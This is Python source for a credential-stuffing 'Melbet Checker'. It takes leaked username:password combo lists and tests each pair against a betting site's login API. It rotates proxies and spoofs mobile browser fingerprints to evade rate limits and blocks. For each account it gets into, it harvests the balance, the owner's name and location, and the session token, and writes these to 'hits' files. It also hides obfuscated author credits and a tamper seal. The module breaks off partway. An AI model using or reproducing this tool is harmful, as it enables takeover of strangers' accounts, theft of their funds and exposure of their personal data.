#any problem lmk @samvir1
import os
import re
import sys
import json
import time
import base64
import random
import string
import hashlib
import threading
import subprocess
import configparser
import urllib3
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

try:
    from curl_cffi import requests as cffi
    _HAVE_CFFI = True
except ImportError:
    _HAVE_CFFI = False
    import requests as cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v69"
EYELIFTER_YEAR = "2026"

_F1T = "TWVs"
_F2T = "YmV0"
_F3T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "TWVsYmV0Xw=="
_F2D = "QGV5ZWxpZnRlcg=="
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.mel.seal")
_EYELIFTER_SEALED = None


def eyelifter_d(e):
    try:
        pad = "=" * (-len(e) % 4)
        return base64.b64decode(e + pad).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)

EYELIFTER_TOOL = eyelifter_j(_F1T, _F2T, _F3T)
EYELIFTER_TG_USER = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS = eyelifter_j(_F1D, _F2D)
EYELIFTER_TAG = eyelifter_j(_F1G, _F2G)
EYELIFTER_SEAL_STR = eyelifter_j(_F1S, _F2S)

EYELIFTER_TOOL_NAME = EYELIFTER_TOOL
EYELIFTER_TG_USERNAME = EYELIFTER_TG_USER
EYELIFTER_TG_CHANNEL = EYELIFTER_TG_CHAN
EYELIFTER_RESULTS_DIR = EYELIFTER_RESULTS
EYELIFTER_AUTHOR_TAG = EYELIFTER_TAG
EYELIFTER_SEAL_TEXT = EYELIFTER_SEAL_STR
EYELIFTER_LINE_TAG = f"by {EYELIFTER_TG_USERNAME} | {EYELIFTER_TG_CHANNEL}"
EYELIFTER_EXPECTED_TOOL = "Melbet Checker"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL_NAME != EYELIFTER_EXPECTED_TOOL:
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USERNAME != "@samvir1" or EYELIFTER_TG_CHANNEL != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_debug(msg, tag="DEBUG"):
    if not _EYELIFTER_CFG.settings.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, msg)


def eyelifter_rline(i, t, st, txt, c, bold=False):
    with _CL:
        pre = f"[{i}/{t}]"
        if _ANSI:
            print(f"{eyelifter_color('90', pre)} {eyelifter_color(c, st.ljust(6), bold)} {txt}", flush=True)
        else:
            print(f"{pre} {st.ljust(6)} {txt}", flush=True)


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    side = max(1, (width - len(lbl)) // 2)
    print(eyelifter_color("90", "─" * side) + eyelifter_color("96", lbl, True)
          + eyelifter_color("90", "─" * (width - len(lbl) - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", title.center(width), True))
    if sub:
        print(eyelifter_color("2", sub.center(width)))
    print(eyelifter_color("5", f"eyelifter · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL}".center(width)))
    print(eyelifter_color("90", line * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96", f"═══ eyelifter · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL} ═══", True))
    if not rows:
        return
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  {v}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("MEL_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_mel.ini"
)
EYELIFTER_MAX_THREADS = 200

EYELIFTER_BASE = "https://melbet-10485.com"
EYELIFTER_LOGIN_PAGE = f"{EYELIFTER_BASE}/en/user/login"
EYELIFTER_SECURE_URL = f"{EYELIFTER_BASE}/web-api/user/secure"
EYELIFTER_AUTH_URL = f"{EYELIFTER_BASE}/web-api/user/auth"
EYELIFTER_BALANCE_URL = f"{EYELIFTER_BASE}/account-api/user/balance"
EYELIFTER_ACCOUNT_URL = f"{EYELIFTER_BASE}/web-api/officeapi/getaccountdata"

EYELIFTER_X_HD = ("Mn7SQPX+17pi9BwNEjcvwknUJG1HQn+qG2c/xUC0arclXUJPEtnu5flPSKIqfBPZNmzrRK5zhGlOA4WeC9VMmTSGEYVk4pfMXLfPK9rT8Uu5dEBg65pnrOWLP0O747OGawOfjgdO+nWnq4DgNJtHI271STi7Qn66AieckbRkYqGnxXX70ONZpTFZbwUW81hXgWK7GNEL+yfero9Szmt9rxIe6A4Jxbqg4uLdQ+oKa0YS/jLk5PltAfp18gtiX/kfrukYIWZj7eazkVhaZQ==")

EYELIFTER_UAS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

EYELIFTER_COMBORX = re.compile(
    r'^\s*('
    r'\d{6,15}'
    r'|[^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,}'
    r'|[A-Za-z0-9_.\-]{3,64}'
    r')\s*:\s*([^\s|]+)',
    re.I,
)

EYELIFTER_GRANT_RX = re.compile(r'^_grant_(\d+)$')


def eyelifter_make_session(proxy=None):
    ua = random.choice(EYELIFTER_UAS)
    if _HAVE_CFFI:
        try:
            s = cffi.Session(impersonate="chrome131_android", timeout=40)
        except Exception:
            s = cffi.Session(impersonate="chrome", timeout=40)
    else:
        s = cffi.Session()
    s.verify = False
    s.headers.update({
        "user-agent": ua,
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "upgrade-insecure-requests": "1",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_api_headers(referer=None, svc="__WELCOME_APP__", token=None):
    referer = referer or EYELIFTER_LOGIN_PAGE
    h = {
        "x-svc-source": svc,
        "x-app-n": svc,
        "x-hd": EYELIFTER_X_HD,
        "x-language": "en",
        "is-srv": "false",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "x-requested-with": "XMLHttpRequest",
        "referer": referer,
        "origin": EYELIFTER_BASE,
    }
    if token:
        h["x-auth"] = f"Bearer {token}"
    return h


def eyelifter_b64(s):
    return base64.b64encode(str(s).encode()).decode()


def eyelifter_parse_balance(j):
    if not isinstance(j, dict):
        return 0.0, "USD"
    bal = j.get("balance")
    if isinstance(bal, list) and bal:
        first = bal[0]
        if isinstance(first, dict):
            amount = first.get("money") or first.get("Balance") or 0
            cur = first.get("kode") or first.get("currency") or "USD"
            try:
                return float(str(amount).replace(",", "")), str(cur)
            except (ValueError, TypeError):
                return 0.0, str(cur)

    for key_path in (
        ("balance",), ("data", "balance"), ("result", "balance"),
        ("user", "balance"), ("wallet", "balance"),
        ("amount",), ("money",), ("deposit",),
    ):
        node = j
        ok = True
        for k in key_path:
            if isinstance(node, dict) and k in node:
                node = node[k]
            else:
                ok = False
                break
        if ok and node not in (None, ""):
            try:
                return float(str(node).replace(",", "")), "USD"
            except (ValueError, TypeError):
                pass
    return 0.0, "USD"


def eyelifter_decode_jwt(token):
    if not token or token.count(".") != 2:
        return {}
    try:
        _, payload, _ = token.split(".")
        pad = "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload + pad).decode())
    except Exception:
        return {}


def eyelifter_debug_dump(ctx, r, ident=""):
    if not _EYELIFTER_CFG.settings.get("debug", False):
        return
    try:
        code = getattr(r, "status_code", "?")
        url = getattr(r, "url", "?")
        text = getattr(r, "text", "") or ""
        snippet = re.sub(r"\s+", " ", text[:250])
        eyelifter_log("🐛", "DEBUG", ctx,
            f"[{ctx}] {code} {str(url)[:70]} len={len(text)}")
        if snippet:
            eyelifter_log("🐛", "DEBUG", "BODY", f"{snippet[:240]}")
    except Exception as e:
        eyelifter_log("🐛", "DEBUG", ctx, f"dump failed: {e}")


def eyelifter_check_account(identifier, password, proxy=None, timeout=40):
    eyelifter_debug("checking → warm", "CHECK")
    s = eyelifter_make_session(proxy)
    try:
        return _eyelifter_check_account_inner(s, identifier, password, timeout)
    finally:
        try:
            s.close()
        except Exception:
            pass


def _eyelifter_check_account_inner(s, identifier, password, timeout=40):
    try:
        r1 = s.get(EYELIFTER_LOGIN_PAGE, timeout=max(30, timeout))
    except Exception as e:
        return {"status": "error", "error_type": f"warm_net_{type(e).__name__}"}

    eyelifter_debug_dump("warm", r1, identifier)

    if r1.status_code == 429:
        return {"status": "error", "error_type": "rate_limit"}
    if r1.status_code == 203:
        return {"status": "error", "error_type": "warm_block"}
    if r1.status_code != 200:
        return {"status": "error", "error_type": f"warm_{r1.status_code}"}

    r1_text = (r1.text or "").lower()
    r1_url = str(r1.url or "").lower()
    block_markers = (
        "/en/block", "/block", "sys-technical-pages",
        "access denied", "region is blocked", "not available in your region",
        "cf-chl", "just a moment", "attention required",
    )
    if any(m in r1_url or m in r1_text for m in block_markers):
        return {"status": "error", "error_type": "warm_block"}

    eyelifter_debug("checking → secure", "CHECK")
    try:
        rs = s.post(EYELIFTER_SECURE_URL, data="{}", timeout=max(30, timeout),
                    headers=eyelifter_api_headers())
    except Exception as e:
        return {"status": "error", "error_type": f"secure_net_{type(e).__name__}"}

    eyelifter_debug_dump("secure", rs, identifier)

    if rs.status_code == 429:
        return {"status": "error", "error_type": "rate_limit"}
    if rs.status_code != 200:
        return {"status": "error", "error_type": f"secure_{rs.status_code}"}

    try:
        sj = rs.json()
    except Exception:
        return {"status": "error", "error_type": "secure_parse"}

    grant_field = None
    grant_value = None
    for k, v in sj.items():
        if EYELIFTER_GRANT_RX.match(k):
            grant_field = k
            grant_value = v
            break

    if not grant_field:
        return {"status": "error", "error_type": "no_grant"}

    try:
        s.cookies.set(grant_field, grant_value, domain="melbet-10485.com")
    except Exception:
        pass

    eyelifter_debug(f"grant={grant_field} value={grant_value}", "GRANT")

    body = {
        "uLogin": eyelifter_b64(identifier),
        "uPassword": eyelifter_b64(password),
        "save": True,
        "comp_d": "",
    }

    eyelifter_debug("checking → auth", "CHECK")
    try:
        ra = s.post(EYELIFTER_AUTH_URL, data=json.dumps(body),
                    timeout=max(30, timeout),
                    headers=eyelifter_api_headers(referer=EYELIFTER_LOGIN_PAGE,
                                                   svc="__WELCOME_APP__"))
    except Exception as e:
        return {"status": "error", "error_type": f"auth_net_{type(e).__name__}"}

    eyelifter_debug_dump("auth", ra, identifier)

    if ra.status_code == 429:
        return {"status": "error", "error_type": "rate_limit"}
    if ra.status_code in (401, 403):
        return {"status": "bad", "reason": "unauthorized"}

    try:
        aj = ra.json()
    except Exception:
        return {"status": "error", "error_type": "auth_parse"}

    if not aj.get("success"):
        rtype = aj.get("type")
        raw_msg = (aj.get("message") or aj.get("detail") or "").strip()
        errs_early = aj.get("errors") or []
        err_codes = []
        if isinstance(errs_early, list):
            for e in errs_early:
                if isinstance(e, dict):
                    try:
                        err_codes.append(int(e.get("code", 0)))
                    except (ValueError, TypeError):
                        pass
        if any(c in (3002, 3003, 3004) for c in err_codes):
            return {"status": "error", "error_type": "xhd_stale",
                    "message": f"fingerprint update required, codes={err_codes}"}
        msg = raw_msg.lower()
        errs = aj.get("errors") or []
        if errs and isinstance(errs, list):
            first = errs[0] or {}
            emsg = (first.get("detail") or first.get("title") or "").strip()
            if emsg:
                raw_msg = emsg
                msg = emsg.lower()

        eyelifter_debug(f"auth_fail type={rtype} msg={raw_msg!r}", "AUTH")

        if rtype == 9:
            return {"status": "bad", "reason": "invalid_credentials",
                    "server_msg": raw_msg}
        if rtype in (10, 11, 12):
            return {"status": "bad", "reason": "account_locked",
                    "server_msg": raw_msg}
        if rtype == 27:
            return {"status": "bad", "reason": "account_blocked",
                    "server_msg": raw_msg}
        if rtype == 8 or "captcha" in msg:
            return {"status": "error", "error_type": "captcha",
                    "message": raw_msg}

        if "incorrect username or password" in msg:
            return {"status": "bad", "reason": "invalid_credentials",
                    "server_msg": raw_msg}
        if any(x in msg for x in ("incorrect", "invalid", "wrong",
                                   "password", "login", "identifi",
                                   "неверн", "блокир")):
            return {"status": "bad", "reason": "invalid_credentials",
                    "server_msg": raw_msg}
        return {"status": "error", "error_type": "auth_fail",
                "message": raw_msg[:120]}

    user = aj.get("user") or {}
    token = aj.get("token") or ""

    eyelifter_debug(f"auth ok user_id={user.get('id')} type={aj.get('type')}", "AUTH")

    balance = 0.0
    account = {}

    if token:
        eyelifter_debug("checking → balance", "CHECK")
        try:
            rb = s.get(EYELIFTER_BALANCE_URL, timeout=max(30, timeout),
                       headers=eyelifter_api_headers(
                           referer=f"{EYELIFTER_BASE}/en/office/account", token=token))
            eyelifter_debug_dump("balance", rb, identifier)
            if rb.status_code == 200 and rb.text:
                try:
                    bj = rb.json()
                    balance, _ = eyelifter_parse_balance(bj)
                    eyelifter_debug(f"balance=${balance:.2f}", "BAL")
                except Exception:
                    pass
        except Exception:
            pass

        eyelifter_debug("checking → account", "CHECK")
        try:
            racc = s.get(EYELIFTER_ACCOUNT_URL, timeout=max(30, timeout),
                         headers=eyelifter_api_headers(
                             referer=f"{EYELIFTER_BASE}/en/office/account", token=token))
            eyelifter_debug_dump("account", racc, identifier)
            if racc.status_code == 200 and racc.text:
                try:
                    account = racc.json() or {}
                except Exception:
                    account = {}
        except Exception:
            pass

    jwt = eyelifter_decode_jwt(token) if token else {}

    return {
        "status": "ok",
        "identifier": identifier,
        "password": password,
        "user_id": user.get("id"),
        "name": user.get("name") or "",
        "surname": user.get("surname") or "",
        "country": user.get("country") or "",
        "country_id": user.get("country_id"),
        "region": user.get("region") or "",
        "city": user.get("city") or "",
        "sr_login": user.get("SR_login") or "",
        "video_id": user.get("video_id") or "",
        "type": aj.get("type"),
        "token": token,
        "jwt": jwt,
        "balance": balance,
        "account": account,
        "raw_auth": aj,
    }


def eyelifter_classify(result, cfg):
    if result.get("status") == "bad":
        return "bad", None
    if result.get("status") != "ok":
        return "error", None
    balance = float(result.get("balance") or 0)

    enr = {
        "identifier": result.get("identifier") or "",
        "password": result.get("password", ""),
        "user_id": result.get("user_id"),
        "name": result.get("name") or "",
        "surname": result.get("surname") or "",
        "full_name": (f"{result.get('name','')} {result.get('surname','')}"
                       ).strip() or "-",
        "country": result.get("country") or "",
        "country_id": result.get("country_id"),
        "region": result.get("region") or "",
        "city": result.get("city") or "",
        "sr_login": result.get("sr_login") or "",
        "type": result.get("type"),
        "token": result.get("token") or "",
        "jwt": result.get("jwt") or {},
        "balance": balance,
        "account": result.get("account") or {},
    }

    if balance > 0:
        enr["hit_reason"] = f"bal=${balance:.2f}"
        return "hit", enr

    enr["hit_reason"] = "zero balance"
    return "free", enr


def eyelifter_fmt_line(combo, u, status, for_file=False):
    tag = {"hit": "HIT", "free": "FREE", "bad": "BAD",
           "error": "ERR"}.get(status, "?")
    parts = []
    if u.get("user_id"):
        parts.append(f"UID={u['user_id']}")
    if u.get("full_name") and u["full_name"] != "-":
        parts.append(f"Name={u['full_name']}")
    if u.get("country"):
        parts.append(f"Country={u['country']}")
    if u.get("city"):
        parts.append(f"City={u['city']}")
    parts.append(f"Bal=${u.get('balance', 0):.2f}")
    if u.get("type") is not None:
        parts.append(f"Type={u['type']}")
    if u.get("hit_reason"):
        parts.append(f"Reason={u['hit_reason']}")
    if for_file:
        parts.append(EYELIFTER_LINE_TAG)
    return f"{tag} {combo} | " + " | ".join(parts)


class EyelifterConfig:
    def __init__(self, cf=EYELIFTER_CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.settings = {}
        self.eyelifter_load()

    def eyelifter_load(self):
        if not os.path.exists(self.config_file):
            self.eyelifter_default()
        try:
            self.cp.read(self.config_file, encoding="utf-8")
        except Exception:
            self.eyelifter_default()
            self.cp.read(self.config_file, encoding="utf-8")
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        c = self.cp["eyelifter"]
        self.settings["threads"] = max(1, min(EYELIFTER_MAX_THREADS, c.getint("threads", 8)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 40)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 1)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["rate_limit_delay"] = max(1, min(120, c.getint("rate_limit_delay", 12)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["debug"] = c.getboolean("debug", False)

    def eyelifter_default(self):
        self.cp["eyelifter"] = {
            "threads": "8",
            "timeout": "40",
            "proxies_file": "proxies.txt",
            "retries": "1",
            "retry_delay": "1.5",
            "combo_delay": "0.4",
            "rate_limit_delay": "12",
            "skip_proxy_test": "false",
            "open_channel_on_launch": "true",
            "debug": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)

    def eyelifter_save(self):
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        for k, v in self.settings.items():
            self.cp["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)

    def getfloat(self, k, d=0.0):
        try:
            return float(self.settings.get(k, d))
        except (ValueError, TypeError):
            return d


_EYELIFTER_CFG = EyelifterConfig()


def eyelifter_parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None


def eyelifter_load_proxies(path):
    if not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 10}
        if _HAVE_CFFI:
            kw["impersonate"] = "chrome131_android"
        r = cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good = []
    done = [0]
    dead = [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY",
                  f"testing {total} proxies (100 workers) [eyelifter]")

    def _probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            d = done[0]
            if ok:
                good.append(p)
            else:
                dead[0] += 1
            if d % 20 == 0 or d == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {d}/{total} — {len(good)} live, {dead[0]} dead [eyelifter]")
        return ok

    with ThreadPoolExecutor(max_workers=min(100, total)) as ex:
        futs = [ex.submit(_probe, p) for p in proxies]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    return good or proxies


_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()
_EYELIFTER_STOP = threading.Event()

_EYELIFTER_ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0,
                 "errors": 0, "rl": 0, "pfails": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = set()
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = 0.0
_EYELIFTER_HIT_F = _EYELIFTER_FREE_F = _EYELIFTER_BAD_F = _EYELIFTER_ERR_F = None
_EYELIFTER_FOLDER = None


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP, _EYELIFTER_BADP, _EYELIFTER_RLU
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0,
                         "errors": 0, "rl": 0, "pfails": 0}
        _EYELIFTER_START = time.time()
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = set()
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = 0.0


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _EYELIFTER_PK:
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP:
            return
        _EYELIFTER_BADP.add(p)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _EYELIFTER_RLU
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = max(_EYELIFTER_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU - time.time()
        if gap <= 0:
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_run_with_retries(combo, proxy):
    identifier, password = combo.split(":", 1)
    identifier = identifier.strip()
    password = password.strip()

    attempts = _EYELIFTER_CFG.settings.get("retries", 1) + 1
    timeout = _EYELIFTER_CFG.settings.get("timeout", 40)
    lp = proxy
    result = None

    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_log("🔁", "STEP", "RETRY",
                    f"attempt {a+1}/{attempts} · {identifier[:40]} [eyelifter]")
            lp = proxy

            try:
                result = eyelifter_check_account(identifier, password, proxy, timeout)
            except Exception as e:
                result = {"status": "error",
                          "error_type": "crash", "message": str(e)[:120]}

            if result.get("status") in ("ok", "bad"):
                break

            et = result.get("error_type", "")
            is_last = a == attempts - 1

            if et == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                w = min(_EYELIFTER_CFG.settings.get("rate_limit_delay", 12) * (2 ** a), 120)
                eyelifter_rl_backoff(w)
                if _EYELIFTER_STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if et in ("secure_403", "auth_403", "captcha"):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                if not is_last and _EYELIFTER_STOP.wait(_EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et.startswith(("warm_net_", "secure_net_", "auth_net_")):
                if proxy is None:
                    break
                eyelifter_bad_proxy(proxy)
                if not is_last and _EYELIFTER_STOP.wait(_EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et in ("warm_block",):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                if not is_last:
                    continue
                break

            if et in ("xhd_stale",):
                return {"status": "error", "error_type": "xhd_stale",
                        "message": "melbet demands fresh fingerprint"}

            if et in ("no_grant", "secure_parse", "auth_parse", "no_token"):
                if proxy:
                    eyelifter_cool_proxy(proxy, 20.0)
                backoff = min(2.0 * (2 ** a), 30.0)
                jitter = backoff * (0.5 + random.random() * 0.6)
                if not is_last and _EYELIFTER_STOP.wait(jitter):
                    break
                continue

            if not is_last and _EYELIFTER_STOP.wait(_EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error", "error_type": "no_result"}


def eyelifter_record(combo, result):
    global _EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F, _EYELIFTER_ERR_F

    st = result.get("status", "error")
    if st == "ok":
        verdict, enr = eyelifter_classify(result, _EYELIFTER_CFG)
    else:
        verdict = st
        enr = None

    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if verdict == "hit":
            _EYELIFTER_ST["hit"] += 1
        elif verdict == "free":
            _EYELIFTER_ST["free"] += 1
        elif verdict == "bad":
            _EYELIFTER_ST["bad"] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    if verdict in ("hit", "free"):
        line_term = eyelifter_fmt_line(combo, enr, verdict, for_file=False)
        line_file = eyelifter_fmt_line(combo, enr, verdict, for_file=True)
        if verdict == "hit":
            eyelifter_rline(done, total, "HIT", line_term, "32", True)
            eyelifter_sw(_EYELIFTER_HIT_F, line_file + "\n\n")
        else:
            eyelifter_rline(done, total, "FREE", line_term, "36")
            eyelifter_sw(_EYELIFTER_FREE_F, line_file + "\n\n")
    elif verdict == "bad":
        reason = result.get("reason", "invalid")
        eyelifter_rline(done, total, "BAD",
                        f"BAD {combo} | {reason}", "31")
        eyelifter_sw(_EYELIFTER_BAD_F,
                     f"BAD {combo} | {reason} | {EYELIFTER_LINE_TAG}\n\n") 
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "")
        eyelifter_rline(done, total, "ERR", f"ERR {combo} | [{et}] {msg}", "33")
        eyelifter_sw(_EYELIFTER_ERR_F,
                     f"ERR {combo} | [{et}] {msg} | {EYELIFTER_LINE_TAG}\n\n")


def eyelifter_extract_combos(content):
    out = set()
    skipped = 0
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBORX.match(line)
        if m:
            ident = m.group(1).strip()
            if "@" in ident:
                ident = ident.lower()
            pwd = m.group(2).strip()
            if ident and pwd:
                out.add(f"{ident}:{pwd}")
        else:
            skipped += 1
    if skipped:
        eyelifter_log("🧹", "INFO", "EXTRACT",
                      f"{skipped} lines skipped [eyelifter]")
    return sorted(out)


def eyelifter_open_files(folder):
    names = ["mel_hits.txt", "mel_free.txt", "mel_bad.txt", "mel_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


